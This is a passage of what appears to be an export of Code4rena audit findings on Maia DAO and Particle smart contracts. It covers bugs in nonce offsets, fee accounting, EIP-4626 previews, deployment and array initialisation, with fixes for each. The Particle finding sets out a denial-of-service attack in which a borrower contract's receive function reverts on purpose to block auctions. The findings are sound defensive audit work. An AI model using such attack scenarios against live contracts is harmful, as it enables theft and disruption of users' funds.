we'll need to analyze to determine the correct offset where the depositNonce was packed. - Let's analyze flag by flag the encoded data and determine the correct offset of the `depositNonce` for each flag  1. **`flag == 0x00`**     - When [encoding the data for the flag 0x00](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L480-L481), we can see that **the `depositNonce` is located at the data[1:5]** ```solidity bytes memory packedData =           abi.encodePacked(bytes1(0x00), depositNonce, _params, gasToBridgeOut, _remoteExecutionGas);  // data[0]    ==> flag === 0x00 // data[1:5]  ==> depositNonce ```  2. **`flag == 0x01`**     - When [encoding the data for the flag 0x01](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L656-L657), we can see that **the `depositNonce` is located at the data[1:5]** ```solidity bytes memory packedData =         abi.encodePacked(bytes1(0x01), depositNonce, _params, _gasToBridgeOut, _remoteExecutionGas);  // data[0]    ==> flag === 0x01 // data[1:5]  ==> depositNonce ```  3. **`flag == 0x02`**     - When [encoding the data for the flag 0x02](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L680-L692), we can see that **the `depositNonce` is located at the data[1:5]** ```solidity bytes memory packedData = abi.encodePacked(     bytes1(0x02),     depositNonce,     _dParams.hToken,     _dParams.token,     _dParams.amount,     _normalizeDecimals(_dParams.deposit, ERC20(_dParams.token).decimals()),     _dParams.toChain,     _params,     _gasToBridgeOut,     _remoteExecutionGas );  // data[0]    ==> flag === 0x02 // data[1:5]  ==> depositNonce ```  4. **`flag == 0x03`**     - When [encoding the data for the flag 0x03](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L723-L736), we can see that **the `depositNonce` is located at the data[2:6]** ```solidity bytes memory packedData = abi.encodePacked(     bytes1(0x03),     uint8(_dParams.hTokens.length),     depositNonce,     _dParams.hTokens,     _dParams.tokens,     _dParams.amounts,     deposits,     _dParams.toChain,     _params,     _gasToBridgeOut,     _remoteExecutionGas );  // data[0]    ==> flag === 0x03 // data[1]    ==> hTones.length // data[2:6]  ==> depositNonce ```  5. **`flag == 0x04`**     - When [encoding the data for the flag 0x04](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L225-L228), we can see that **the `depositNonce` is located at the data[21:25]** ```solidity bytes memory packedData = abi.encodePacked(     bytes1(0x04), msg.sender, depositNonce, _params, msg.value.toUint128(), _remoteExecutionGas );  // data[0]    ==> flag === 0x04 // data[1:21] ==> msg.sender // data[21:25]  ==> depositNonce ```  6. **`flag == 0x05`**     - When [encoding the data for the flag 0x05](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L244-L257), we can see that **the `depositNonce` is located at the data[21:25]** ```solidity bytes memory packedData = abi.encodePacked(     bytes1(0x05),     msg.sender,     depositNonce,     _dParams.hToken,     _dParams.token,     _dParams.amount,     _normalizeDecimals(_dParams.deposit, ERC20(_dParams.token).decimals()),     _dParams.toChain,     _params,     msg.value.toUint128(),     _remoteExecutionGas );  // data[0]    ==> flag === 0x05 // data[1:21] ==> msg.sender // data[21:25]  ==> depositNonce ```  7. **`flag == 0x06`**     - When [encoding the data for the flag 0x06](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L287-L301), we can see that **the `depositNonce` is located at the data[22:26]** ```solidity bytes memory packedData = abi.encodePacked(     bytes1(0x06),     msg.sender,     uint8(_dParams.hTokens.length),     depositNonce,     _dParams.hTokens,     _dParams.tokens,     _dParams.amounts,     _deposits,     _dParams.toChain,     _params,     msg.value.toUint128(),     _remoteExecutionGas );  // data[0]     ==> flag === 0x06 // data[1:21]  ==> msg.sender // data[21]    ==> hTokens.length // data[22:26] ==> depositNonce ```  - At this point now we know the exact offset where the `depositNonce` is located at for all the possible deposit options. - Now is time to analyze the offset that are been read depending on the flag in the anyFallback() and validate that the correct offset is been read.  1. For `flags 0x00 , 0x01 & 0x02`, the `depositNonce` is been read from the offset `data[PARAMS_START:PARAMS_TKN_START]`, which is the same as `data[1:5]` ([PARAMS_START == 1](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L68) & [PARAMS_TKN_START == 5](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L78)), **these 3 flags read correctly the `depositNonce`**  2. For `flag 0x03`, the `depositNonce` is been read from the offset `data[PARAMS_START + PARAMS_START:PARAMS_TKN_START + PARAMS_START]`, which is the same as `data[2:6]` ([PARAMS_START == 1](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L68) & [PARAMS_TKN_START == 5](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L78)), **this flag also reads correctly the `depositNonce`**  3. For `flag 0x04 & 0x05`, the `depositNonce` is been read from the offset `data[PARAMS_START_SIGNED:PARAMS_START_SIGNED + PARAMS_TKN_START]`, which is the same as `data[21:26]` ([PARAMS_START_SIGNED == 21](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L70) & [PARAMS_TKN_START == 5](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L78)), **these flags are reading INCORRECTLY the `depositNonce`**, from the above analyzis to detect where the `depositNonce` is located at, we got that **for flags 0x04 & 0x05, the `depositNonce` is located at the offset data[21:25]**  **PoC to demonstrate the correct offset of the depositNonce when data is encoded similar to how flags 0x04 & 0x05 encode it (See the above analysis for more details)** 1. call the `generateData()` function and copy+paste the generated bytes on the rest of the functions 2. Notice how the `readNonce()` returns the correct value of the nonce, and is reading the offset `data[21:25]` ```solidity pragma solidity 0.8.18;  contract offset {     uint32 nonce = 3;      function generateData() external view returns (bytes memory) {         bytes memory packedData = abi.encodePacked(             bytes1(0x01),             msg.sender,             nonce         );         return packedData;     }      function readFlag(bytes calldata data) external view returns(bytes1) {         return data[0];     }      function readMsgSender(bytes calldata data) external view returns (address) {         return address(uint160(bytes20(data[1:21])));     }      function readNonce(bytes calldata data) external view returns (uint32) {         return uint32(             bytes4(data[21:25])         );     }     } ```  3. For `flag 0x06`, the `depositNonce` is been read from the offset `data[PARAMS_START_SIGNED + PARAMS_START:PARAMS_START_SIGNED + PARAMS_TKN_START + PARAMS_START]`, which is the same as `data[22:27]` ([PARAMS_START_SIGNED == 21](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L70), [PARAMS_START == 1](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L68) & [PARAMS_TKN_START == 5](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L78)), **this flag is also reading INCORRECTLY the `depositNonce`**, from the above analyzis to detect where the `depositNonce` is located at, we got that **for flag 0x06, the `depositNonce` is located at the offset data[22:26]**  **PoC to demonstrate the correct offset of the depositNonce when data is encoded similar to how flag 0x06 encode it (See the above analysis for more details)** 1. call the `generateData()` function and copy+paste the generated bytes on the rest of the functions 2. Notice how the `readNonce()` returns the correct value of the nonce, and is reading the offset `data[22:26]` ```solidity pragma solidity 0.8.18;  contract offset {     uint32 nonce = 3;      function generateData() external view returns (bytes memory) {         bytes memory packedData = abi.encodePacked(             bytes1(0x01),             msg.sender,             uint8(1),             nonce         );         return packedData;     }      function readFlag(bytes calldata data) external view returns(bytes1) {         return data[0];     }      function readMsgSender(bytes calldata data) external view returns (address) {         return address(uint160(bytes20(data[1:21])));     }      function readThirdParameter(bytes calldata data) external view returns(uint8) {         return uint8(bytes1(data[21]));     }      function readNonce(bytes calldata data) external view returns (uint32) {         return uint32(             bytes4(data[22:26])         );     }  } ```  ## Tools Used Manual Audit  ## Recommended Mitigation Steps - Make sure to read the `depositNonce` from the correct offset, depending on the flag it will be the offset where `depositNonce` is located at:  - For `flags 0x04 & 0x05`, read the offset as follows, either of the two options are correct:   - `depositNonce` is located at: `data[21:25]` ```solidity _depositNonce = uint32(bytes4(data[PARAMS_START_SIGNED : PARAMS_START_SIGNED])); _depositNonce = uint32(bytes4(data[21:25])); ```  - For `flag 0x06`, read the offset as follows, either of the two options are correct:   - `depositNonce` is located at: `data[22:26]` ```solidity _depositNonce = uint32(bytes4(data[PARAMS_START_SIGNED + PARAMS_START : PARAMS_START_SIGNED + PARAMS_TKN_START])); _depositNonce = uint32(bytes4(data[22:26])); ```   ## Assessed type  en/de-code"}, {"title": "`BaseV2Minter` DAO reward shares are calculated wrong", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/104", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-33"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/hermes/minters/BaseV2Minter.sol#L134-L136   # Vulnerability details  ## Impact  In `BaseV2Minter` when calculating the DAO shares out of the weekly emissions, the current implementation wrongly also takes into consideration the extra `bHERMES` growth tokens (to the locked) thus is allocated a larger value then intended. This also has an indirect effect of increasing protocol inflation if `HERMES` [needs to be minted in order to reach the required token amount](https://github.com/code-423n4/2023-05-maia/blob/main/src/hermes/minters/BaseV2Minter.sol#L138-L141).  ### Issue details  Token DAO shares (`share` variable) is calculated in `BaseV2Minter::updatePeriod` as such:  https://github.com/code-423n4/2023-05-maia/blob/main/src/hermes/minters/BaseV2Minter.sol#L133-L137 ```Solidity     uint256 _growth = calculateGrowth(newWeeklyEmission);     uint256 _required = _growth + newWeeklyEmission;     /// @dev share of newWeeklyEmission emissions sent to DAO.     uint256 share = (_required * daoShare) / base;     _required += share; ```  We actually do see that the original developer intention (confirmed by sponsor) was that the share value to be calculated relative to `newWeeklyEmission`, not to (`_required = newWeeklyEmission + _growth`)  ```Solidity     /// @dev share of newWeeklyEmission emissions sent to DAO. ```  Also, it is [documented that DAO shares should be calculated as part of weekly emissions](https://v2-docs.maiadao.io/protocols/Hermes/overview/tokenomics/emissions#dao-emissions):  > Up to 30% of weekly emissions can be allocated to the DAO.  ## Proof of Concept  DAO shares value is not calculated relative to `newWeeklyEmission`  https://github.com/code-423n4/2023-05-maia/blob/main/src/hermes/minters/BaseV2Minter.sol#L134-L136  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  Change the implementation to reflect intention  ```diff diff --git a/src/hermes/minters/BaseV2Minter.sol b/src/hermes/minters/BaseV2Minter.sol index 7d7f013..217a028 100644 --- a/src/hermes/minters/BaseV2Minter.sol +++ b/src/hermes/minters/BaseV2Minter.sol @@ -133,7 +133,7 @@ contract BaseV2Minter is Ownable, IBaseV2Minter {              uint256 _growth = calculateGrowth(newWeeklyEmission);              uint256 _required = _growth + newWeeklyEmission;              /// @dev share of newWeeklyEmission emissions sent to DAO. -            uint256 share = (_required * daoShare) / base; +            uint256 share = (newWeeklyEmission * daoShare) / base;              _required += share;              uint256 _balanceOf = underlying.balanceOf(address(this));              if (_balanceOf < _required) {  ```   ## Assessed type  Other"}, {"title": "UlyssesPool.sol does not match EIP4626 because of preview functions", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/98", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-42"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-4626/UlyssesERC4626.sol#L96-L106   # Vulnerability details  ## Impact According to EIP4626 `previewDeposit()`, `previewRedeem()`, `previewMint()` must include fee in returned value: 1. previewDeposit \"MUST be inclusive of deposit fees. Integrators should be aware of the existence of deposit fees.\" 2. previewRedeem \"MUST be inclusive of withdrawal fees. Integrators should be aware of the existence of withdrawal fees.\" 3. previewMint \"MUST be inclusive of deposit fees. Integrators should be aware of the existence of deposit fees.\"  ## Proof of Concept UlyssesPool.sol inherits UlyssesERC4626.sol with default implementation: https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-4626/UlyssesERC4626.sol#L96-L106 ```solidity     function previewDeposit(uint256 assets) public view virtual returns (uint256) {         return assets;     }      function previewMint(uint256 shares) public view virtual returns (uint256) {         return shares;     }      function previewRedeem(uint256 shares) public view virtual returns (uint256) {         return shares;     } ``` However deposit, redeem, mint in UlyssesPool.sol take fees: https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-amm/UlyssesPool.sol#L1200-L1221 ```solidity     function beforeDeposit(uint256 assets) internal override returns (uint256 shares) {         // Update deposit/mint         shares = ulyssesAddLP(assets, true);     }      /**      * @notice Performs the necessary steps to make after depositing.      * @param assets to be deposited      */     function beforeMint(uint256 shares) internal override returns (uint256 assets) {         // Update deposit/mint         assets = ulyssesAddLP(shares, false);     }      /**      * @notice Performs the necessary steps to take before withdrawing assets      * @param shares to be burned      */     function afterRedeem(uint256 shares) internal override returns (uint256 assets) {         // Update withdraw/redeem         assets = ulyssesRemoveLP(shares);     } ``` Further you can check that functions `ulyssesAddLP()` and `ulyssesRemoveLP()` take fee. I consider it overabundant in this submission  ## Tools Used Manual Review  ## Recommended Mitigation Steps Override preview functions in UlyssesPool.sol to include fee   ## Assessed type  ERC4626"}, {"title": "Cross-chain messaging via Anycall will fail", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/91", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-34"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L1006-L1011 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/lib/AnycallFlags.sol#L11   # Vulnerability details  ## Impact Cross-chain calls will fail since source-fee is not supplied to Anycall  ## Proof of Concept In `_performCall()` of BranchBridgeAgent.sol, a cross-chain called is made using `anyCall()` with the `_flag` of [4](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/lib/AnycallFlags.sol#L11).  According to the [Anycall V7 documentation](https://docs.multichain.org/developer-guide/anycall-v7/how-to-integrate-anycall-v7#request-parameters) and [code](https://github.com/anyswap/multichain-smart-contracts/blob/645d0053d22ed63005b9414b5610879094932304/contracts/anycall/v7/AnycallV7Upgradeable.sol#L205-L207), when using gas `_flag` of 4, the gas fee must be paid on the source chain. This means `anyCall()` must be called and sent gas.   However, this is not the case, and the result is `_performCall` will always revert. This will impact many functions that rely on this function such as `callOut()`, `callOutSigned()`,  `retryDeposit()`, and etc.  ## Tools Used Manual  ## Recommended Mitigation Steps After discussing with the Sponsor, it is expected that the fee be paid on the destination chain, specifically the `rootBridgeAgent`. Consider refactoring the code to change the `_flag` to use [pay on destination](https://github.com/anyswap/multichain-smart-contracts/blob/645d0053d22ed63005b9414b5610879094932304/contracts/anycall/v7/interfaces/AnycallFlags.sol#L9).  Alternatively, if pay on source is the intention, consider refactoring the code to include fees, starting with `_performCall`. Additional refactoring will be required. ``` function _performCall(bytes memory _calldata, uint256 _fee) internal virtual {     //Sends message to AnycallProxy     IAnycallProxy(localAnyCallAddress).anyCall{value: _fee}(         rootBridgeAgentAddress, _calldata, rootChainId, AnycallFlags.FLAG_ALLOW_FALLBACK, \"\"     ); } ```          ## Assessed type  Library"}, {"title": "Rerange/rebalance should not use protocolFee as asset for adding liquidity", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/80", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-35"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/talos/libraries/PoolActions.sol#L55-L88 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/talos/libraries/PoolActions.sol#L90-L103   # Vulnerability details  ## Impact Account of protocol fee is broken, because tokens of `protocolFee0` and `protocolFee1` are used while rerange/rebalance to add liquidity. At the same time this variables `protocolFee0` and `protocolFee1` are not updated, and de facto contract doesn't have protocol fee on balance  ## Proof of Concept Function rerange is used both in rerange and in rebalance: https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/talos/strategies/TalosStrategySimple.sol#L30-L46 ```solidity     function doRerange() internal override returns (uint256 amount0, uint256 amount1) {         (tickLower, tickUpper, amount0, amount1, tokenId, liquidity) = nonfungiblePositionManager.rerange(             PoolActions.ActionParams(pool, optimizer, token0, token1, tickSpacing), poolFee         );     }      function doRebalance() internal override returns (uint256 amount0, uint256 amount1) {         int24 baseThreshold = tickSpacing * optimizer.tickRangeMultiplier();          PoolActions.ActionParams memory actionParams =             PoolActions.ActionParams(pool, optimizer, token0, token1, tickSpacing);          PoolActions.swapToEqualAmounts(actionParams, baseThreshold);          (tickLower, tickUpper, amount0, amount1, tokenId, liquidity) =             nonfungiblePositionManager.rerange(actionParams, poolFee);     } ``` Let's have a look at this function. This function calls `getThisPositionTicks` to get the amounts balance0 and balance1 of tokens to addLiquidity: https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/talos/libraries/PoolActions.sol#L56-L88 ```solidity     function rerange(         INonfungiblePositionManager nonfungiblePositionManager,         ActionParams memory actionParams,         uint24 poolFee     )         internal         returns (int24 tickLower, int24 tickUpper, uint256 amount0, uint256 amount1, uint256 tokenId, uint128 liquidity)     {         int24 baseThreshold = actionParams.tickSpacing * actionParams.optimizer.tickRangeMultiplier();          uint256 balance0;         uint256 balance1;         (balance0, balance1, tickLower, tickUpper) = getThisPositionTicks(             actionParams.pool, actionParams.token0, actionParams.token1, baseThreshold, actionParams.tickSpacing         );         emit Snapshot(balance0, balance1);          (tokenId, liquidity, amount0, amount1) = nonfungiblePositionManager.mint(             INonfungiblePositionManager.MintParams({                 token0: address(actionParams.token0),                 token1: address(actionParams.token1),                 amount0Desired: balance0,                 amount1Desired: balance1,                 ...             })         );     } ```  Mistake is in function `getThisPositionTicks()` because it returns actual token balance of Strategy contract: https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/talos/libraries/PoolActions.sol#L90-L103 ```solidity     function getThisPositionTicks(         IUniswapV3Pool pool,         ERC20 token0,         ERC20 token1,         int24 baseThreshold,         int24 tickSpacing     ) private view returns (uint256 balance0, uint256 balance1, int24 tickLower, int24 tickUpper) {         // Emit snapshot to record balances         balance0 = token0.balanceOf(address(this));         balance1 = token1.balanceOf(address(this));          //Get exact ticks depending on Optimizer's balances         (tickLower, tickUpper) = pool.getPositionTicks(balance0, balance1, baseThreshold, tickSpacing);     } ```  Returns actual balance which consists of 2 parts: protocolFee and users' funds. Rerange must use users' funds, but not protocolFee.  Suppose following scenario: 1) User added 1000 tokens of liquidity 2) This liquidity generated 100 tokens of fee, 50 of which is protocolFee 3) Rerange is called. After removing liquidity contract has 1000 + 100 tokens balance. And contract add liquidity of whole balance - 1100 tokens 4) Function collectFee doesn't work because actual balance is less than withdrawing amount. And protocol loses profit: https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/talos/base/TalosBaseStrategy.sol#L394-L415 ```solidity     function collectProtocolFees(uint256 amount0, uint256 amount1) external nonReentrant onlyOwner {         uint256 _protocolFees0 = protocolFees0;         uint256 _protocolFees1 = protocolFees1;          if (amount0 > _protocolFees0) {             revert Token0AmountIsBiggerThanProtocolFees();         }         if (amount1 > _protocolFees1) {             revert Token1AmountIsBiggerThanProtocolFees();         }         ERC20 _token0 = token0;         ERC20 _token1 = token1;         uint256 balance0 = _token0.balanceOf(address(this));         uint256 balance1 = _token1.balanceOf(address(this));         require(balance0 >= amount0 && balance1 >= amount1);         if (amount0 > 0) _token0.transfer(msg.sender, amount0);         if (amount1 > 0) _token1.transfer(msg.sender, amount1);          protocolFees0 = _protocolFees0 - amount0;         protocolFees1 = _protocolFees1 - amount1;         emit RewardPaid(msg.sender, amount0, amount1);     } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps I suggest using different address for protocolFee. Transfer all protocolFee tokens away from this contract to not mix it with users' assets. Create a contract like \"ProtocolFeeReceiver.sol\" and make force transfer of tokens when Strategy gets fee  Also want to note that in forked parent project SorbettoFragola it is implemented via burnExactLiquidity https://github.com/Popsicle-Finance/SorbettoFragola/blob/9fb31b74f19005d86a78abc758553e7914e7ba49/SorbettoFragola.sol#L458-L483         ## Assessed type  Math"}, {"title": "Deploy flow of Talos is  broken", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/75", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-43"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/talos/base/TalosBaseStrategy.sol#L83   # Vulnerability details  ## Impact Talos protocol can't be deployed in a right way.  ## Proof of Concept TalosBaseStrategy needs TalosManager to be passed in constructor: https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/talos/base/TalosBaseStrategy.sol#L79-L95 ```solidity     constructor(         IUniswapV3Pool _pool,         ITalosOptimizer _optimizer,         INonfungiblePositionManager _nonfungiblePositionManager,         address _strategyManager,         address _owner     ) ERC20(\"TALOS LP\", \"TLP\", 18) {         ...          strategyManager = _strategyManager;                  ...     } ```  But TalosManager needs Strategy to be passed in constructor: https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/talos/TalosManager.sol#L44-L56 ```solidity    constructor(         address _strategy,         int24 _ticksFromLowerRebalance,         int24 _ticksFromUpperRebalance,         int24 _ticksFromLowerRerange,         int24 _ticksFromUpperRerange     ) {         strategy = ITalosBaseStrategy(_strategy);                  ...     } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps Add setters for complete deploy, or initializing function   ## Assessed type  DoS"}, {"title": "Improper array initialization causes index out of bounds error", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/25", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-44"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/ccc9a39240dbd8eab22299737370996b2b833efd/src/ulysses-amm/factories/UlyssesFactory.sol#L93   # Vulnerability details  ## Impact In `createPools` of UlyssesFactory.sol, the return parameter `poolIds` is used to store new pool ids after creation. However, it has not been initialized. This causes an index out of bounds error when `createPools` is called.  ## Proof of Concept Any test that calls `ulyssesFactory.createPools(...);` will cause index out of bounds  ## Tools Used Manual review  ## Recommended Mitigation Steps Consider adding this line: ``` poolIds = new uint256[](length); ```   ## Assessed type  Invalid Validation"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/13", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "edited-by-warden", "G-27"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/Sathish9098-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/12", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-15"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/Sathish9098-Q.md)."}, {"title": "`ParticleExchange.auctionBuyNft` and `ParticleExchange.withdrawEthWithInterest` function calls can be DOS'ed", "html_url": "https://github.com/code-423n4/2023-05-particle-findings/issues/31", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "H-01"], "target": "2023-05-particle-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-particle/blob/bbd1c01407a017046c86fdb483bbabfb1fb085d8/contracts/protocol/ParticleExchange.sol#L688-L748 https://github.com/code-423n4/2023-05-particle/blob/bbd1c01407a017046c86fdb483bbabfb1fb085d8/contracts/protocol/ParticleExchange.sol#L192-L223   # Vulnerability details  ## Impact When `lien.borrower` is a contract, its `receive` function can be coded to conditionally revert based on a state boolean variable controlled by `lien.borrower`'s owner. As long as `payback > 0` is true, `lien.borrower`'s `receive` function would be called when calling the following `ParticleExchange.auctionBuyNft` function. In this situation, if the owner of `lien.borrower` intends to DOS the `ParticleExchange.auctionBuyNft` function call, especially when `lien.credit` is low or 0, she or he would make `lien.borrower`'s `receive` function revert.  https://github.com/code-423n4/2023-05-particle/blob/bbd1c01407a017046c86fdb483bbabfb1fb085d8/contracts/protocol/ParticleExchange.sol#L688-L748 ```solidity     function auctionBuyNft(         Lien calldata lien,         uint256 lienId,         uint256 tokenId,         uint256 amount     ) external override validateLien(lien, lienId) auctionLive(lien) {         ...          // pay PnL to borrower         uint256 payback = lien.credit + lien.price - payableInterest - amount;         if (payback > 0) {             payable(lien.borrower).transfer(payback);         }          ...     } ```  Moreover, after the auction of the lien is concluded, calling the following `ParticleExchange.withdrawEthWithInterest` function can call `lien.borrower`'s `receive` function as long as `lien.credit > payableInterest` is true. In this case, the owner of `lien.borrower` can also make `lien.borrower`'s `receive` function revert to DOS the `ParticleExchange.withdrawEthWithInterest` function call.  https://github.com/code-423n4/2023-05-particle/blob/bbd1c01407a017046c86fdb483bbabfb1fb085d8/contracts/protocol/ParticleExchange.sol#L192-L223 ```solidity     function withdrawEthWithInterest(Lien calldata lien, uint256 lienId) external override validateLien(lien, lienId) {         ...          uint256 payableInterest = _calculateCurrentPayableInterest(lien);          // verify that the liquidation condition has met (borrower insolvent or auction concluded)         if (payableInterest < lien.credit && !_auctionConcluded(lien.auctionStartTime)) {             revert Errors.LiquidationHasNotReached();         }          // delete lien (delete first to prevent reentrancy)         delete liens[lienId];          // transfer ETH with interest back to lender         payable(lien.lender).transfer(lien.price + payableInterest);          // transfer PnL to borrower         if (lien.credit > payableInterest) {             payable(lien.borrower).transfer(lien.credit - payableInterest);         }          ...     } ```  The similar situations can happen if `lien.borrower` does not implement the `receive` or `fallback` function intentionally in which `lien.borrower`'s owner is willing to pay some position margin, which can be a low amount depending on the corresponding lien, to DOS the `ParticleExchange.auctionBuyNft` and `ParticleExchange.withdrawEthWithInterest` function calls.  ## Proof of Concept The following steps can occur for the described scenario for the `ParticleExchange.auctionBuyNft` function. The situation for the `ParticleExchange.withdrawEthWithInterest` function is similar. 1. Alice is the owner of `lien.borrower` for a lien. 2. The lender of the lien starts the auction for the lien. 3. Alice does not want the auction to succeed so she makes `lien.borrower`'s `receive` function revert through changing the controlled state boolean variable for launching the DOS attack to true. 4. For couple times during the auction period, some other users are willing to win the auction by supplying an NFT from the same collection but their `ParticleExchange.auctionBuyNft` function calls all revert. 5. Since no one's `ParticleExchange.auctionBuyNft` transaction is executed at the last second of the auction period, the auction is DOS'ed.  ## Tools Used VSCode  ## Recommended Mitigation Steps The `ParticleExchange.auctionBuyNft` and `ParticleExchange.withdrawEthWithInterest` functions can be updated to record the `payback` and `lien.credit - payableInterest` amounts that should belong to `lien.borrower` instead of directly sending these amounts to `lien.borrower`. Then, a function can be added to let `lien.borrower` to call and receive these recorded amounts.   ## Assessed type  DoS"}, {"title": "Function `buyNftFromMarket()` should not be payable", "html_url": "https://github.com/code-423n4/2023-05-particle-findings/issues/23", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "satisfactory", "sponsor confirmed"], "target": "2023-05-particle-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-particle/blob/main/contracts/protocol/ParticleExchange.sol#L346   # Vulnerability details  # Function `buyNftFromMarket()` should not be payable  The `buyNftFromMarket()` function is marked as payable but fails to consider callvalue.  ## Impact  The `buyNftFromMarket()` function present in the ParticleExchange contract implements the flow in which the borrower buys an NFT in the marketplace in order to repay and close the loan.  https://github.com/code-423n4/2023-05-particle/blob/main/contracts/protocol/ParticleExchange.sol#L338-L393  ```solidity 338:     function buyNftFromMarket( 339:         Lien calldata lien, 340:         uint256 lienId, 341:         uint256 tokenId, 342:         uint256 amount, 343:         uint256 useToken, 344:         address marketplace, 345:         bytes calldata tradeData 346:     ) external payable override validateLien(lien, lienId) { 347:         if (msg.sender != lien.borrower) { 348:             revert Errors.Unauthorized(); 349:         } 350:  351:         if (lien.loanStartTime == 0) { 352:             revert Errors.InactiveLoan(); 353:         } 354:  355:         uint256 payableInterest = _calculateCurrentPayableInterest(lien); 356:  357:         /// @dev cannot overspend (will revert if payback to borrower < 0) 358:         // since: credit = sold amount + position margin - lien.price 359:         // and:   payback = sold amount + position margin - bought amount - interest 360:         // hence: payback = credit + lien.price - bought amount - interest 361:         uint256 payback = lien.credit + lien.price - amount - payableInterest; 362:  363:         // update lien (by default, the lien is open to accept new loan) 364:         /// @dev update lien before paybacks to prevent reentrancy 365:         liens[lienId] = keccak256( 366:             abi.encode( 367:                 Lien({ 368:                     lender: lien.lender, 369:                     borrower: address(0), 370:                     collection: lien.collection, 371:                     tokenId: tokenId, 372:                     price: lien.price, 373:                     rate: lien.rate, 374:                     loanStartTime: 0, 375:                     credit: 0, 376:                     